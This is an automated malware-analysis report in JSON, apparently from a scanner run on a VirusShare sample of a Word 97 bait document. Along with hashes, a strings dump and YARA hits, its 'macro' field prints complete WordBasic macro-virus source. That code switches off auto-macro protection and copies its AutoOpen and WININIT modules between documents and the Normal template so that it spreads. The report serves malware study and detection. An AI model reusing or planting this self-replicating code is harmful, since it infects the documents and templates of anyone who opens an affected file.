{
    "docinfo": {
        "attributes": [
            "Attribute VB_Name = \"AutoOpen\"",
            "Attribute VB_Name = \"WININIT\""
        ],
        "behavior": {
            "AutoClose": "Runs when the Word document is closed",
            "AutoOpen": "Runs when the Word document is opened",
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str"
        },
        "macro": "\n\n\nPublic Sub MAIN()\nAttribute MAIN.VB_Description = \"F%\"\nAttribute MAIN.VB_ProcData.VB_Invoke_Func = \"TemplateProject.AutoOpen.MAIN\"\nDim J$\nOn Error GoTo -1: On Error GoTo Finish\nWordBasic.DisableAutoMacros 0\nJ$ = LCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))\nIf J$ = \"normal.dot\" Then\n    If VI = 1 Then\n        GoTo Finish\n    Else\n        InfectDOC\n    End If\nElse\n    If VI2 = 1 Then\n        GoTo Finish\n    Else\n        InfectGlobal\n    End If\nEnd If\nFinish:\n\n\n\n\n\n                   \n\n                   \n                   \n                   \n                   \n                      \n                      \n                      \n                      \n                      \n               End Sub\n\nPrivate Function VI()\nDim i\nVI = 0\nIf WordBasic.CountMacros > 0 Then\n    For i = 1 To WordBasic.CountMacros(1)\n                If WordBasic.[MacroName$](i, 1) = \"WININIT\" Then\n                             VI = 1\n        End If\n    Next i\nEnd If\nEnd Function\n\nPrivate Function VI2()\nDim i\nVI2 = 0\nIf WordBasic.CountMacros(0) > 0 Then\n    For i = 1 To WordBasic.CountMacros(0)\n                If WordBasic.[MacroName$](i, 0) = \"WININIT\" Then\n                             VI2 = 1\n        End If\n    Next i\nEnd If\nEnd Function\n\nPrivate Sub InfectDOC()\nWordBasic.FileSaveAs Format:=1\nWordBasic.MacroCopy \"Global:AutoClose\", WordBasic.[FileName$]() + \":AutoOpen\"\nWordBasic.MacroCopy \"Global:WININIT\", WordBasic.[FileName$]() + \":WININIT\"\nWordBasic.FileSaveAll 1, 1\nEnd Sub\n\nPrivate Sub InfectGlobal()\nWordBasic.MacroCopy WordBasic.[FileName$]() + \":AutoOpen\", \"Global:AutoClose\"\nWordBasic.MacroCopy WordBasic.[FileName$]() + \":WININIT\", \"Global:WININIT\"\nWordBasic.FileSaveAll 1, 0\nEnd Sub\n\n\n"
    },
    "filename": "VirusShare_41f86992514ad950271acddd1fe82fdf",
    "filesize": 30720,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 5.0, Code page: 1252, Title: Virus Infected Bait File, Author: Joe Hartmann, Template: HAVS1.DOC, Last Saved By: MACRO, Revision Number: 3, Name of Creating Application: Microsoft Word 8.0, Create Time/Date: Tue Apr 25 07:02:00 2000, Last Saved Time/Date: Tue Apr 25 07:02:00 2000, Number of Pages: 1, Number of Words: 8, Number of Characters: 47, Security: 0",
    "hashes": {
        "md5": "41f86992514ad950271acddd1fe82fdf",
        "sha1": "485edafe49bc93a41cfc3b9622577877f3badd50",
        "sha256": "a3fa1f013e3f69e10b04644a60e807e53075d5d06f9904eb9fd234f4a1893913"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbj\u064e",
            "p}5{",
            "Virus Infected Bait File",
            "Joe Hartmann - HAVS",
            "Virus Name: ",
            ". A!",
            "D&D&",
            "Virus Infected Bait File",
            "Joe Hartmann",
            "HAVS1.DOC",
            "MACRO",
            "Microsoft Word 8.0",
            "Virus Infected Bait File",
            "Title",
            "_PID_GUID",
            "p}5{",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "0{00020P906-",
            "$0046}",
            "|Creatabl",
            "False",
            "Predecla",
            "\"@Expose",
            "emplateD0eriv",
            "eCustomiz",
            "TemplateProject.AutoOpen.MAIN",
            "normal.dot",
            "WININIT",
            "WININIT",
            "Global:AutoClose ",
            ":AutoOpen",
            "Global:WININIT ",
            ":WININIT",
            "ic.[Fl",
            ":AutoOpen",
            "Global:AutoClose ",
            ":WININIT",
            "Global:WININIT ",
            "Attribut",
            "e VB_Nam",
            "e = \"Aut",
            "oOpen\"",
            "Public",
            " Sub MAI`N()",
            "rDescription",
            "JProcDat",
            "bInvoke _Func",
            "1Te@mplate",
            "\"ject.",
            "Dim J$",
            "On Error",
            " GoTo -1",
            "Finis",
            "WordB",
            "asic.Dis",
            "able",
            "PMac",
            "ros 0",
            "tLCase(",
            "[Right$]\t\t",
            "File",
            "0)), 1a",
            "ormal.do",
            "t\" Then",
            "ElsFe",
            "\tEnd IXf",
            "+25,Global",
            "\\A9Priv@ ",
            "@cGCountAs > 0~F%iCmo ",
            "(1@M4J",
            "DiB)",
            "\"WIN@",
            "#R$K",
            "Next ",
            "!2!R",
            "\"(0)",
            "/:z\"",
            "VIi\"p",
            "`e\"Fw\"G<S@aveAs @m`at:=1\u9582:Copy \"s:AClose\",HE[) + \"",
            "ll 1M",
            ", %\t'",
            "Attribut",
            "e VB_Nam",
            "e = \"WIN",
            "739053508",
            "839053508",
            "939053508",
            "ZB!'",
            "Wordk",
            "Win16~",
            "Win32",
            "HAVS1B",
            "stdole`",
            "MSFormsC",
            "ThisDocument<",
            "_Evaluate",
            "Office",
            "TemplateProjectE",
            "Module1b",
            "AutoClose",
            "MAIN,",
            "FinishX",
            "WordBasic",
            "DisableAutoMacros",
            "LCase:",
            "Right$y1",
            "MacroFileName$J",
            "MacroName$",
            "InfectDOCt",
            "InfectGlobal",
            "CountMacros",
            "FileSaveAs",
            "MacroCopyE",
            "FileName$m",
            "FileSaveAll",
            "AutoOpen*",
            "WININIT9",
            "Documentj",
            "Template",
            "Project",
            "9std",
            "ole>",
            "\\G{00020430-",
            "0046}#",
            "2.0#0#C:",
            "\\WINDOWS",
            "\\System3",
            "e2.tlb",
            "#OLE Automation",
            "MSForms>",
            "GC42122",
            "7E-A2B1-",
            "49C1-99B",
            "9-E4E17E@B759FE",
            "4.TWD#M",
            "icrosoft ",
            "b Ob",
            " LibraryG",
            "Q9206C8",
            "D3-B515-",
            "4D21-AAB",
            "2-D007E1@250233(D",
            "OCUME~1\\@JOEHAR",
            "L`OCALS",
            "~\\VBE\\E-EXg-",
            "~Offic",
            "0}12DF8",
            "D04C-5BF",
            "A-101B-BHDE5",
            "21OFFIC",
            "E97\\ENGL",
            "ISH\\WORD",
            "/O97.D",
            "LL\\C! 8.0E",
            "ThisD",
            "ocument",
            "/TiE",
            "pP$n",
            "a`@gINIT",
            "ThisDocument",
            "AutoOpen",
            "WININIT",
            "ID=\"{4C968AD2-B0F4-4D06-B883-0F38E9729868}\"",
            "Document=ThisDocument/&H00000000",
            "Module=AutoOpen",
            "Module=WININIT",
            "Name=\"TemplateProject\"",
            "HelpContextID=\"0\"",
            "CMG=\"5A588D7FD983D983D983D983\"",
            "DPB=\"P",
            "AAA87D2FCC30CC30CC\"",
            "GC=\"FAF82D9F7CA07CA083\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "Microsoft Word Document",
            "MSWordDoc",
            "Word.Document.8"
        ],
        "file": {
            "HAVS1.DOC": "Word"
        },
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.303362",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "maldoc_somerules.yar": "Office_AutoOpen_Macro"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
